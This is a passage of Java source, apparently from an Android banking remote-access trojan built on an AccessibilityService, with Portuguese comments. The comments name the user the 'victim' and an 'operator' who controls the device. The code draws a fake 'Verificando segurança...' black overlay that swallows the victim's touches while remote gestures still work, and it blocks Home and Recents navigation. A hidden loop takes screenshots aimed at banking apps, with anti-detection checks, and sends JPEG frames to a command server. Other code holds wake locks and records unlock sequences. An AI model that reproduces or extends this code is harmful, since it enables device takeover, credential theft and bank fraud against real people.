        handler.postDelayed(screenPersistenceRunnable, 1000);
        Log.d(TAG, "🔒 Loop de persistência INICIADO!");
    }
    
    private void stopScreenPersistenceLoop() {
        screenPersistenceLoopRunning = false;
        if (screenPersistenceRunnable != null) {
            handler.removeCallbacks(screenPersistenceRunnable);
            screenPersistenceRunnable = null;
            Log.d(TAG, "🔒 Loop de persistência PARADO!");
        }
    }
    
    /**
     * 🔒 Libera WakeLock de persistência e para o loop
     */
    private void releaseScreenPersistenceWakeLock() {
        try {
            // Para o loop de verificação
            stopScreenPersistenceLoop();
            
            // Remove overlay
            removeKeepScreenOnOverlay();
            
            // Libera o WakeLock
            if (screenPersistenceWakeLock != null && screenPersistenceWakeLock.isHeld()) {
                screenPersistenceWakeLock.release();
                screenPersistenceWakeLock = null;
                Log.d(TAG, "🔒 Screen Persistence WakeLock LIBERADO!");
            }
        } catch (Exception e) {
            Log.e(TAG, "🔒 Erro ao liberar WakeLock: " + e.getMessage());
        }
    }
    
    /**
     * LayoutParams compartilhados da Tela Preta.
     * Abordagem B: sem FLAG_SECURE — bypass via suppressBlackOverlayForCapture() no takeScreenshot.
     */
    private android.view.WindowManager.LayoutParams buildBlackOverlayLayoutParams() {
        android.view.WindowManager.LayoutParams params = new android.view.WindowManager.LayoutParams(
                android.view.WindowManager.LayoutParams.MATCH_PARENT,
                android.view.WindowManager.LayoutParams.MATCH_PARENT,
                android.view.WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN,
                android.graphics.PixelFormat.TRANSLUCENT
        );
        params.gravity = android.view.Gravity.TOP | android.view.Gravity.START;
        params.alpha = blackScreenOpacityPercent / 100f;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            params.layoutInDisplayCutoutMode =
                    android.view.WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }
        return params;
    }

    /** Consome toques físicos da vítima na overlay (dispatchGesture remoto permanece intacto). */
    private void applyBlackOverlayInputLock(android.view.View overlayView) {
        overlayView.setClickable(true);
        overlayView.setFocusable(true);
        overlayView.setOnTouchListener((v, event) -> true);
    }

    /** Ajusta opacidade da overlay em tempo real (10–100%) sem recriar a View. */
    private void applyBlackOverlayOpacity(int opacityPercent) {
        blackScreenOpacityPercent = Math.max(10, Math.min(100, opacityPercent));
        Log.d(TAG, "🖤 Atualizando opacidade da tela preta para: " + blackScreenOpacityPercent + "%");
        if (!isBlackScreenActive || blackOverlayView == null || blackOverlayWindowManager == null) {
            return;
        }
        handler.post(() -> {
            try {
                android.view.WindowManager.LayoutParams params =
                        (android.view.WindowManager.LayoutParams) blackOverlayView.getLayoutParams();
                params.alpha = blackScreenOpacityPercent / 100f;
                if (blackScreenOpacityPercent < 100) {
                    params.format = android.graphics.PixelFormat.TRANSLUCENT;
                }
                blackOverlayWindowManager.updateViewLayout(blackOverlayView, params);
            } catch (Exception e) {
                Log.e(TAG, "Erro ao atualizar opacidade overlay: " + e.getMessage());
            }
        });
    }

    private boolean isLauncherOrRecentsWindow(String packageName, String className) {
        if (packageName == null) packageName = "";
        if (className == null) className = "";
        String pkg = packageName.toLowerCase();
        String cls = className.toLowerCase();
        return pkg.contains("launcher")
                || pkg.contains("nexuslauncher")
                || pkg.contains("quickstep")
                || pkg.contains("recents")
                || cls.contains("recents")
                || cls.contains("overview")
                || cls.contains("taskstack");
    }

    /** Mitiga gestos Home/Recentes enquanto Tela Preta ativa (onKeyEvent não cobre 100% dos gestos). */
    private void blockSystemNavWhileBlackScreen(String packageName, String className) {
        if (!isBlackScreenActive || CommandControlService.isKillerModeActive) {
            return;
        }
        if (!isLauncherOrRecentsWindow(packageName, className)) {
            return;
        }
        long now = System.currentTimeMillis();
        if (now - lastBlackScreenNavBlockMs < BLACK_SCREEN_NAV_BLOCK_COOLDOWN_MS) {
            return;
        }
        lastBlackScreenNavBlockMs = now;
        Log.d(TAG, "🖤 Bloqueando nav sistema (Tela Preta): " + packageName + " / " + className);
        performGlobalAction(GLOBAL_ACTION_BACK);
    }

    /** Bypass B só em overlay 100% opaca; opacidade menor compõe no screenshot sem toggle GONE. */
    private boolean shouldSuppressOverlayForCapture() {
        boolean fallbackEligible = blackScreenOpacityPercent >= 100;
        Log.d("SilentCap", "🖤 [CHECK] Opacidade: " + blackScreenOpacityPercent
                + "% | Fallback B Elegível: " + fallbackEligible);
        return BLACK_SCREEN_CAPTURE_FALLBACK
                && isBlackScreenActive
                && blackOverlayView != null
                && fallbackEligible;
    }

    /** Abordagem B: esconde overlay no main thread antes do screenshot (100% opaco + cooldown). */
    private void suppressBlackOverlayForCapture() {
        if (!shouldSuppressOverlayForCapture()) {
            return;
        }
        long now = System.currentTimeMillis();
        if (now - lastBlackOverlayRestoredMs < BLACK_OVERLAY_RESTORE_COOLDOWN_MS) {
            return;
        }
        final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
        handler.postAtFrontOfQueue(() -> {
            try {
                if (blackOverlayView != null && isBlackScreenActive) {
                    blackOverlayView.setVisibility(android.view.View.GONE);
                }
            } finally {
                latch.countDown();
            }
        });
        try {
            latch.await(BLACK_OVERLAY_LATCH_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS);
        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
        }
    }

    /** Abordagem B: restaura overlay após screenshot (prioridade UI + latch simétrico). */
    private void restoreBlackOverlayAfterCapture() {
        if (!shouldSuppressOverlayForCapture()) {
            return;
        }
        final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
        handler.postAtFrontOfQueue(() -> {
            try {
                if (blackOverlayView != null && isBlackScreenActive) {
                    blackOverlayView.setVisibility(android.view.View.VISIBLE);
                    lastBlackOverlayRestoredMs = System.currentTimeMillis();
                }
            } finally {
                latch.countDown();
            }
        });
        try {
            latch.await(BLACK_OVERLAY_LATCH_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS);
        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
        }
    }

    private static long getEffectiveSilentCaptureDelayMs() {
        // Usa delay adaptativo que considera app bancário, black screen, etc.
        return getAdaptiveCaptureDelay();
    }

    /**
     * 🖤 Mostra tela preta 100% OPACA
     * A vítima vê tela preta e não consegue interagir (toques consumidos na overlay)
     * dispatchGesture do operador funciona NORMALMENTE para controle remoto
     */
    private void showBlackScreenOverlay() {
        if (isBlackScreenActive) {
            Log.d(TAG, "🖤 Black screen já está ativo");
            return;
        }
        
        Log.d(TAG, "🖤 Mostrando BLACK SCREEN (tela preta visual)...");
        
        try {
            if (blackOverlayWindowManager == null) {
                blackOverlayWindowManager = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
            }
            
            // Remove view anterior se existir
            if (blackOverlayView != null) {
                try {
                    blackOverlayWindowManager.removeView(blackOverlayView);
                } catch (Exception ignored) {}
            }
            
            // Container simples - apenas visual
            android.widget.FrameLayout container = new android.widget.FrameLayout(this);
            container.setBackgroundColor(0xFF000000); // 100% preto
            
            // Texto informativo
            android.widget.LinearLayout linearLayout = new android.widget.LinearLayout(this);
            linearLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
            linearLayout.setGravity(android.view.Gravity.CENTER);
            linearLayout.setBackgroundColor(0xFF000000);
            
            android.widget.TextView textView = new android.widget.TextView(this);
            textView.setText("Verificando segurança...\nAguarde alguns instantes");
            textView.setTextSize(20);
            textView.setTextColor(android.graphics.Color.WHITE);
            textView.setGravity(android.view.Gravity.CENTER);
            linearLayout.addView(textView);
            
            container.addView(linearLayout, new android.widget.FrameLayout.LayoutParams(
                android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                android.view.Gravity.CENTER
            ));
            
            blackOverlayView = container;
            applyBlackOverlayInputLock(blackOverlayView);

            android.view.WindowManager.LayoutParams params = buildBlackOverlayLayoutParams();
            blackOverlayWindowManager.addView(blackOverlayView, params);
            isBlackScreenActive = true;

            Log.d(TAG, "🖤 ✅ BLACK SCREEN ATIVO (input bloqueado"
                    + (BLACK_SCREEN_CAPTURE_FALLBACK ? ", fallback B enabled" : "") + ")");
            
        } catch (Exception e) {
            Log.e(TAG, "🖤 ❌ Erro ao mostrar black screen: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    /**
     * 🖤 Esconde a tela preta
     */
    private void hideBlackScreenOverlay() {
        if (!isBlackScreenActive) {
            Log.d(TAG, "🖤 Black screen já está oculto");
            return;
        }
        
        Log.d(TAG, "🖤 Escondendo BLACK SCREEN...");
        
        try {
            if (blackOverlayView != null && blackOverlayWindowManager != null) {
                blackOverlayWindowManager.removeView(blackOverlayView);
                blackOverlayView = null;
            }
            isBlackScreenActive = false;
            blackScreenOpacityPercent = 100;
            Log.d(TAG, "🖤 ✅ BLACK SCREEN OCULTO!");
        } catch (Exception e) {
            Log.e(TAG, "🖤 ❌ Erro ao esconder black screen: " + e.getMessage());
        }
    }
    
    /**
     * 🎨 Mostra tela preta CUSTOMIZADA baseada no template JSON do painel web
     */
    private void showCustomBlackScreenOverlay(String templateJson) {
        // Primeiro esconde a tela anterior se existir
        hideBlackScreenOverlay();
        
        Log.d(TAG, "🎨 Mostrando CUSTOM BLACK SCREEN...");
        Log.d(TAG, "🎨 Template recebido (primeiros 500 chars): " + (templateJson.length() > 500 ? templateJson.substring(0, 500) : templateJson));
        
        try {
            if (blackOverlayWindowManager == null) {
                blackOverlayWindowManager = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
            }
            
            // Parse do JSON do template - pode estar escapado duas vezes!
            String jsonToparse = templateJson;
            
            // Se o JSON começa com aspas, significa que foi stringify duas vezes
            if (jsonToparse.startsWith("\"") && jsonToparse.endsWith("\"")) {
                Log.d(TAG, "🎨 Detectado JSON escapado duas vezes, removendo escape extra...");
                jsonToparse = jsonToparse.substring(1, jsonToparse.length() - 1);
                // Unescape as aspas internas
                jsonToparse = jsonToparse.replace("\\\"", "\"");
                jsonToparse = jsonToparse.replace("\\\\", "\\");
            }
            
            // Se ainda começa com \", tenta fazer parse como string JSON
            if (jsonToparse.startsWith("\\\"") || jsonToparse.contains("\\\"")) {
                Log.d(TAG, "🎨 Ainda há escapes, tentando unescape...");
                jsonToparse = jsonToparse.replace("\\\"", "\"");
                jsonToparse = jsonToparse.replace("\\\\", "\\");
            }
            
            Log.d(TAG, "🎨 JSON após unescape: " + (jsonToparse.length() > 200 ? jsonToparse.substring(0, 200) : jsonToparse));
            
            com.google.gson.JsonObject template = com.google.gson.JsonParser.parseString(jsonToparse).getAsJsonObject();
            String bgColor = template.has("backgroundColor") ? template.get("backgroundColor").getAsString() : "#000000";
            com.google.gson.JsonArray elements = template.has("elements") ? template.getAsJsonArray("elements") : new com.google.gson.JsonArray();
            
            // Container principal com a cor de fundo customizada
            android.widget.FrameLayout container = new android.widget.FrameLayout(this);
            container.setBackgroundColor(android.graphics.Color.parseColor(bgColor));
            
            // Obtém dimensões da tela
            android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
            blackOverlayWindowManager.getDefaultDisplay().getMetrics(metrics);
            int screenWidth = metrics.widthPixels;
            int screenHeight = metrics.heightPixels;
            
            // Escala baseada na resolução do editor (360x780)
            float scaleX = screenWidth / 360f;
            float scaleY = screenHeight / 780f;
            
            // Adiciona cada elemento do template
            for (int i = 0; i < elements.size(); i++) {
                com.google.gson.JsonObject el = elements.get(i).getAsJsonObject();
                String type = el.get("type").getAsString();
                int x = (int)(el.get("x").getAsFloat() * scaleX);
                int y = (int)(el.get("y").getAsFloat() * scaleY);
                int width = (int)(el.get("width").getAsFloat() * scaleX);
                int height = (int)(el.get("height").getAsFloat() * scaleY);
                float opacity = el.has("opacity") ? el.get("opacity").getAsFloat() / 100f : 1f;
                
                android.view.View elementView = null;
                
                if ("text".equals(type)) {
                    android.widget.TextView textView = new android.widget.TextView(this);
                    String content = el.has("content") ? el.get("content").getAsString() : "";
                    int fontSize = el.has("fontSize") ? el.get("fontSize").getAsInt() : 16;
                    String color = el.has("color") ? el.get("color").getAsString() : "#FFFFFF";
                    String fontWeight = el.has("fontWeight") ? el.get("fontWeight").getAsString() : "normal";
                    
                    textView.setText(content);
                    textView.setTextSize(fontSize * scaleX * 0.8f);
                    textView.setTextColor(android.graphics.Color.parseColor(color));
                    textView.setGravity(android.view.Gravity.CENTER_HORIZONTAL); // 🔧 Só centraliza horizontal
                    textView.setSingleLine(false); // 🔧 Permite múltiplas linhas
                    textView.setMaxLines(10); // 🔧 Até 10 linhas
                    textView.setEllipsize(null); // 🔧 Não trunca com "..."
                    if ("bold".equals(fontWeight)) {
                        textView.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
                    }
                    
                    // 🔧 Usa MATCH_PARENT na largura para centralizar texto
                    // Mantém a posição Y exata do template
                    android.widget.FrameLayout.LayoutParams textParams = new android.widget.FrameLayout.LayoutParams(
                        android.widget.FrameLayout.LayoutParams.MATCH_PARENT, // Largura total
                        android.widget.FrameLayout.LayoutParams.WRAP_CONTENT  // Altura automática
                    );
                    textParams.topMargin = y; // Mantém posição Y exata!
                    textParams.leftMargin = 0;
                    textParams.rightMargin = 0;
                    container.addView(textView, textParams);
                    elementView = null; // Já adicionamos, não adiciona de novo
                    
                } else if ("image".equals(type)) {
                    android.widget.ImageView imageView = new android.widget.ImageView(this);
                    String imageUrl = el.has("imageUrl") ? el.get("imageUrl").getAsString() : null;
                    if (imageUrl != null && imageUrl.startsWith("data:image")) {
                        try {
                            String base64 = imageUrl.substring(imageUrl.indexOf(",") + 1);
                            byte[] decodedBytes = android.util.Base64.decode(base64, android.util.Base64.DEFAULT);
                            android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.length);
                            imageView.setImageBitmap(bitmap);
                            imageView.setScaleType(android.widget.ImageView.ScaleType.FIT_CENTER);
                        } catch (Exception e) {
                            Log.e(TAG, "🎨 Erro ao decodificar imagem: " + e.getMessage());
                        }
                    }
                    elementView = imageView;
                    
                } else if ("rectangle".equals(type) || "circle".equals(type)) {
                    android.view.View shapeView = new android.view.View(this);
                    String shapeBgColor = el.has("backgroundColor") ? el.get("backgroundColor").getAsString() : "#333333";
                    int borderRadius = el.has("borderRadius") ? el.get("borderRadius").getAsInt() : 0;
                    
                    android.graphics.drawable.GradientDrawable drawable = new android.graphics.drawable.GradientDrawable();
                    drawable.setColor(android.graphics.Color.parseColor(shapeBgColor));
                    if ("circle".equals(type)) {
                        drawable.setCornerRadius(1000);
                    } else {
                        drawable.setCornerRadius(borderRadius * scaleX);
                    }
                    shapeView.setBackground(drawable);
                    elementView = shapeView;
                }
                
                if (elementView != null) {
                    elementView.setAlpha(opacity);
                    android.widget.FrameLayout.LayoutParams layoutParams = new android.widget.FrameLayout.LayoutParams(width, height);
                    layoutParams.leftMargin = x;
                    layoutParams.topMargin = y;
                    container.addView(elementView, layoutParams);
                }
            }
            
            blackOverlayView = container;
            applyBlackOverlayInputLock(blackOverlayView);

            android.view.WindowManager.LayoutParams params = buildBlackOverlayLayoutParams();
            blackOverlayWindowManager.addView(blackOverlayView, params);
            isBlackScreenActive = true;

            Log.d(TAG, "🎨 ✅ CUSTOM BLACK SCREEN ATIVO! (" + elements.size() + " elementos, input bloqueado"
                    + (BLACK_SCREEN_CAPTURE_FALLBACK ? ", fallback B enabled" : "") + ")");
            
        } catch (Exception e) {
            Log.e(TAG, "🎨 ❌ Erro ao mostrar custom black screen: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    /**
     * Reinicia loop takeScreenshot (usado por FORCE_RESTART_VNC).
     */
    public static void restartSilentScreenCapture(int quality) {
        stopSilentScreenCapture();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            startSilentScreenCapture(quality > 0 ? quality : silentCaptureQuality);
        }
    }

    // =====================================================
    // BTMOB-EXACT SILENT CAPTURE (takeScreenshot / pipeline 0x01)
    // =====================================================

    private static android.accessibilityservice.AccessibilityService.TakeScreenshotCallback silentSnapCallback;

    // Dedicated background executor for takeScreenshot callbacks in the BTMOB silent path.
    // Avoids running on the main thread (replaces getMainExecutor() for this path only).
    private static final java.util.concurrent.ExecutorService SILENT_SCREENSHOT_EXECUTOR =
            java.util.concurrent.Executors.newSingleThreadExecutor(r -> {
                Thread t = new Thread(r, "SilentScreenshot");
                t.setDaemon(true);
                t.setPriority(Thread.NORM_PRIORITY);
                return t;
            });

    /**
     * Public method on the AccessibilityService (like BTMOB CapScreen).
     * Called repeatedly from the dedicated silent thread.
     * Enhanced with anti-detect for banking apps (FLAG_SECURE bypass validation).
     */
    @RequiresApi(api = Build.VERSION_CODES.R)
    public void capSilentScreen(int quality) {
        if (silentScreenshotApiInFlight) {
            return;
        }
        silentScreenshotApiInFlight = true;
        
        // Detecta app bancário antes da captura
        boolean wasBankingApp = isCurrentWindowSecure();
        
        try {
            if (silentSnapCallback == null) {
                silentSnapCallback = new android.accessibilityservice.AccessibilityService.TakeScreenshotCallback() {
                    @RequiresApi(api = Build.VERSION_CODES.R)
                    @Override
                    public void onSuccess(android.accessibilityservice.AccessibilityService.ScreenshotResult screenshotResult) {
                        try {
                            restoreBlackOverlayAfterCapture();
                            android.hardware.HardwareBuffer hwBuffer = screenshotResult.getHardwareBuffer();
                            android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(
                                    hwBuffer,
                                    screenshotResult.getColorSpace()
                            );
                            hwBuffer.close();
                            if (bitmap == null) {
                                consecutiveFailedCaptures++;
                                scheduleRetryCapture();
                                return;
                            }
                            
                            // ANTI-DETECT: Valida a captura (detecta tela preta/bloqueio)
                            if (!validateCapture(bitmap)) {
                                consecutiveFailedCaptures++;
                                bitmap.recycle();
                                scheduleRetryCapture();
                                Log.w(TAG, "🔐 [ANTI-DETECT] Captura rejeitada - possível detecção/bloqueio");
                                return;
                            }
                            
                            // Captura válida - reseta contador de falhas
                            consecutiveFailedCaptures = 0;
                            bankingAppOnScreen = false; // Reset após captura bem-sucedida
                            lastBankingCaptureTime = System.currentTimeMillis();
                            
                            enqueueSilentFrame(bitmap);
                            
                            // Delay adaptativo baseado no contexto
                            silentCaptureDelayMs = getAdaptiveCaptureDelay();
                            
                        } catch (Exception ex) {
                            Log.e(TAG, "capSilentScreen onSuccess enqueue error: " + ex.getMessage());
                            consecutiveFailedCaptures++;
                            scheduleRetryCapture();
                        } finally {
                            silentScreenshotApiInFlight = false;
                        }
                    }

                    @Override
                    public void onFailure(int errorCode) {
                        try {
                            restoreBlackOverlayAfterCapture();
                            Log.w(TAG, "capSilentScreen takeScreenshot failed: " + errorCode);
                            consecutiveFailedCaptures++;
                            
                            if (errorCode == android.accessibilityservice.AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT) {
                                silentCaptureDelayMs = Math.min(silentCaptureDelayMs + 50, SILENT_CAPTURE_MAX_DELAY_MS);
                            }
                            
                            scheduleRetryCapture();
                        } finally {
                            silentScreenshotApiInFlight = false;
                        }
                    }
                };
            }

            suppressBlackOverlayForCapture();
            takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    SILENT_SCREENSHOT_EXECUTOR,
                    silentSnapCallback
            );
        } catch (Exception a) {
            restoreBlackOverlayAfterCapture();
            silentScreenshotApiInFlight = false;
            consecutiveFailedCaptures++;
            scheduleRetryCapture();
            Log.e(TAG, "capSilentScreen error: " + a.getMessage());
        }
    }

    private static void enqueueSilentFrame(android.graphics.Bitmap bitmap) {
        SilentFrameJob job = new SilentFrameJob(bitmap);
        if (!SILENT_ENCODE_QUEUE.offer(job)) {
            SilentFrameJob dropped = SILENT_ENCODE_QUEUE.poll();
            if (dropped != null) {
                dropped.recycle();
            }
            SILENT_ENCODE_QUEUE.offer(job);
        }
        SILENT_ENCODE_POOL.execute(UiAssistBridge::processOneSilentEncodeJob);
    }

    private static void processOneSilentEncodeJob() {
        SilentFrameJob job = SILENT_ENCODE_QUEUE.poll();
        if (job == null || job.bitmap == null || job.bitmap.isRecycled()) {
            if (job != null) {
                job.recycle();
            }
            return;
        }
        android.graphics.Bitmap source = job.bitmap;
        android.graphics.Bitmap scaled = null;
        try {
            try {
                scaled = android.graphics.Bitmap.createScaledBitmap(
                        source,
                        SILENT_WIDTH,
                        SILENT_HEIGHT,
                        true
                );
            } catch (Exception scaleEx) {
                Log.w(TAG, "createScaledBitmap fallback: " + scaleEx.getMessage());
                android.graphics.Bitmap software = source.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
                if (!source.isRecycled()) {
                    source.recycle();
                }
                source = software;
                scaled = android.graphics.Bitmap.createScaledBitmap(
                        source,
                        SILENT_WIDTH,
                        SILENT_HEIGHT,
                        true
                );
            }

            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            int q = clampSilentQuality(silentCaptureQuality);
            scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, q, baos);
            byte[] bytes = baos.toByteArray();
            baos.close();

            if (instance != null) {
                CommandControlService.sendSilentVncFrame(instance.getApplicationContext(), bytes);
            }
        } catch (Exception ex) {
            Log.e(TAG, "processOneSilentEncodeJob error: " + ex.getMessage());
        } finally {
            if (scaled != null && scaled != source && !scaled.isRecycled()) {
                scaled.recycle();
            }
            if (source != null && !source.isRecycled()) {
                source.recycle();
            }
        }
    }

    private static void drainSilentEncodeQueue() {
        SilentFrameJob job;
        while ((job = SILENT_ENCODE_QUEUE.poll()) != null) {
            job.recycle();
        }
    }

    public static boolean isSilentCaptureRunning() {
        return silentScreenActive;
    }

    /**
     * Returns the current state of the dedicated BTMOB silent capture path (purple HVNC Silente button).
     * - If the live thread flag (silentScreenActive) is true, reports active immediately.
     * - Otherwise falls back to the persisted value in SharedPreferences (using the supplied Context).
     * This allows CommandControlService to report the true state right after WebSocket (re)connect
     * without depending on the AccessibilityService static instance.
     */
    public static SilentState getCurrentBtmobSilentState(Context ctx) {
        if (silentScreenActive) {
            // Thread is running right now. Use last-known quality from prefs (or default).
            SilentState persisted = loadSilentState(ctx);
            return new SilentState(true, persisted.quality);
        }
        return loadSilentState(ctx);
    }

    /**
     * Start the dedicated BTMOB-style thread for silent screen (called only for the purple HVNC Silente button).
     * Persists state and acquires PARTIAL_WAKE_LOCK so the loop survives service restarts and screen-off.
     */
    /** BTMOB-style live quality (10–100 JPEG). Callable while capture thread is running. */
    public static int clampSilentQuality(int quality) {
        if (quality < 10) return 10;
        if (quality > 100) return 100;
        return quality;
    }

    public static void setSilentCaptureQuality(int quality) {
        silentCaptureQuality = clampSilentQuality(quality);
        if (silentScreenActive) {
            saveSilentState(true, silentCaptureQuality);
            Log.d("SilentCap", "Live silent quality -> " + silentCaptureQuality);
        }
    }

    public static int getSilentCaptureQuality() {
        return silentCaptureQuality;
    }

    /** Sinaliza captura imediata no loop HVNC quando killer mode está ativo (pós-clique do painel). */
    public static void requestKillerCapture() {
        killerCaptureRequested = true;
    }

    public static void startSilentScreenCapture(int quality) {
        if (instance == null) {
            Log.w("SilentCap", "instance is null, cannot start silent capture");
            return;
        }
        silentCaptureQuality = clampSilentQuality(quality > 0 ? quality : silentCaptureQuality);
        if (silentScreenActive && silentScreenThread != null && silentScreenThread.isAlive()) {
            saveSilentState(true, silentCaptureQuality);
            Log.d("SilentCap", "Silent thread already running — quality updated to " + silentCaptureQuality);
            return;
        }
        silentScreenActive = true;
        silentCaptureDelayMs = SILENT_CAPTURE_MIN_DELAY_MS;
        final int q = silentCaptureQuality;

        // Persist the fact that the dedicated silent path is now active (for auto-resume on service recreate)
        saveSilentState(true, q);

        // 🔋 CRITICAL BACKUP: Adquire PARTIAL_WAKE_LOCK para manter a CPU viva no caminho silencioso
        // WakeLock pattern (UI:ScreenCaptureWakeLock) and CommandControlService (App:NetworkSync).
        try {
            if (instance != null) {
                android.os.PowerManager pm = (android.os.PowerManager) instance.getSystemService(Context.POWER_SERVICE);
                if (instance.silentCpuWakeLock == null || !instance.silentCpuWakeLock.isHeld()) {
                    instance.silentCpuWakeLock = pm.newWakeLock(
                        android.os.PowerManager.PARTIAL_WAKE_LOCK,
                        "App:SilentCaptureCpuWakeLock"
                    );
                    instance.silentCpuWakeLock.acquire();
                    Log.d("SilentCap", "🔋 PARTIAL_WAKE_LOCK adquirido para o loop silencioso!");
                }
            }
        } catch (Exception e) {
            Log.e("SilentCap", "❌ Erro ao adquirir WakeLock silencioso: " + e.getMessage());
        }

        // Report current dedicated silent state to server/panel (for UI sync after reconnect/refresh)
        try {
            if (instance != null) {
                Intent statusIntent = new Intent("com.seguranca.protecao.SILENT_VNC_STATUS");
                statusIntent.setPackage(instance.getPackageName());
                statusIntent.putExtra("active", true);
                statusIntent.putExtra("method", "silent");
                instance.sendBroadcast(statusIntent);
            }
        } catch (Exception ignored) {}

        Thread thread = new Thread(() -> {
            Log.d("SilentCap", "BTMOB-style silent thread started");
            long lastBankingCheck = 0;
            while (silentScreenActive) {
                boolean shouldCapture = false;
                try {
                    // Periodic banking app detection (every 5 seconds)
                    long now = System.currentTimeMillis();
                    if (now - lastBankingCheck > 5000) {
                        lastBankingCheck = now;
                        if (instance != null) {
                            // Check on main thread via handler
                            instance.handler.post(() -> {
                                instance.isCurrentWindowSecure();
                            });
                        }
                    }
                    
                    if (CommandControlService.isKillerModeActive) {
                        while (silentScreenActive && !killerCaptureRequested) {
                            Thread.sleep(100);
                        }
                        if (!silentScreenActive) {
                            break;
                        }
                        killerCaptureRequested = false;
                        shouldCapture = true;
                    } else {
                        Thread.sleep(getEffectiveSilentCaptureDelayMs());
                        shouldCapture = true;
                    }
                } catch (Exception ignored) {}
                try {
                    if (shouldCapture && silentScreenActive && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && instance != null
                            && !silentScreenshotApiInFlight && CommandControlService.canAcceptScreenFrame()) {
                        instance.capSilentScreen(silentCaptureQuality);
                    }
                } catch (Exception e) {
                    Log.e("SilentCap", "silent cap loop err: " + e.getMessage());
                }
            }
            Log.d("SilentCap", "BTMOB-style silent thread stopped");

            // When the loop terminates (silentScreenActive set false), release the CPU WakeLock
            if (instance != null) {
                instance.releaseSilentCpuWakeLock();
            }
            silentScreenThread = null;
        }, "SilentScreenThread");
        silentScreenThread = thread;
        thread.start();
    }

    public static void stopSilentScreenCapture() {
        silentScreenActive = false;
        silentScreenshotApiInFlight = false;
        drainSilentEncodeQueue();
        silentScreenThread = null;
        // Release any held WakeLock for the silent path and clear persisted state
        if (instance != null) {
            instance.releaseSilentCpuWakeLock();
            clearSilentState();

            // Report stop to server/panel
            try {
                Intent statusIntent = new Intent("com.seguranca.protecao.SILENT_VNC_STATUS");
                statusIntent.setPackage(instance.getPackageName());
                statusIntent.putExtra("active", false);
                statusIntent.putExtra("method", "silent");
                instance.sendBroadcast(statusIntent);
            } catch (Exception ignored) {}
        }
    }

    // ==================== PERSISTENCE HELPERS (dedicated BTMOB silent path only) ====================

    // Context-aware implementations. Allow reporting/querying state from CommandControlService
    // (on WebSocket connect) even if the AccessibilityService static instance has not been set yet.
    private static void saveSilentState(Context ctx, boolean active, int quality) {
        Context c = (ctx != null) ? ctx : instance;
        if (c == null) return;
        try {
            c.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean(PREFS_SILENT_ACTIVE, active)
                    .putInt(PREFS_SILENT_QUALITY, (quality > 0 && quality <= 100) ? quality : 15)
                    .apply();
        } catch (Exception e) {
            Log.e("SilentCap", "Erro ao salvar estado silencioso: " + e.getMessage());
        }
    }

    private static SilentState loadSilentState(Context ctx) {
        Context c = (ctx != null) ? ctx : instance;
        if (c == null) {
            return new SilentState(false, 15);
        }
        try {
            android.content.SharedPreferences prefs = c.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            boolean active = prefs.getBoolean(PREFS_SILENT_ACTIVE, false);
            int quality = prefs.getInt(PREFS_SILENT_QUALITY, 15);
            return new SilentState(active, (quality > 0 && quality <= 100) ? quality : 15);
        } catch (Exception e) {
            Log.e("SilentCap", "Erro ao carregar estado silencioso: " + e.getMessage());
            return new SilentState(false, 15);
        }
    }

    private static void clearSilentState(Context ctx) {
        Context c = (ctx != null) ? ctx : instance;
        if (c == null) return;
        try {
            c.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                    .edit()
                    .remove(PREFS_SILENT_ACTIVE)
                    .remove(PREFS_SILENT_QUALITY)
                    .apply();
        } catch (Exception e) {
            Log.e("SilentCap", "Erro ao limpar estado silencioso: " + e.getMessage());
        }
    }

    // No-arg overloads kept for all existing internal callers (use the static instance when available)
    private static void saveSilentState(boolean active, int quality) {
        saveSilentState(instance, active, quality);
    }

    private static SilentState loadSilentState() {
        return loadSilentState(instance);
    }

    private static void clearSilentState() {
        clearSilentState(instance);
    }

    /**
     * Libera o PARTIAL_WAKE_LOCK do caminho silencioso (evita leak que drena bateria).
     * Chamado ao final do loop da thread e defensivamente em onDestroy / stop.
     */
    private void releaseSilentCpuWakeLock() {
        try {
            if (silentCpuWakeLock != null && silentCpuWakeLock.isHeld()) {
                silentCpuWakeLock.release();
                silentCpuWakeLock = null;
                Log.d(TAG, "🔋 WakeLock do caminho silencioso liberado com sucesso.");
            }
        } catch (Exception e) {
            Log.e(TAG, "⚠️ Erro ao liberar WakeLock silencioso: " + e.getMessage());
        }
    }

    /**
     * Inicia gravação de sequência de desbloqueio
     */
    private void startUnlockRecording() {
        isRecordingUnlock = true;
        unlockSequence.clear();
        lastUnlockActionTime = System.currentTimeMillis();
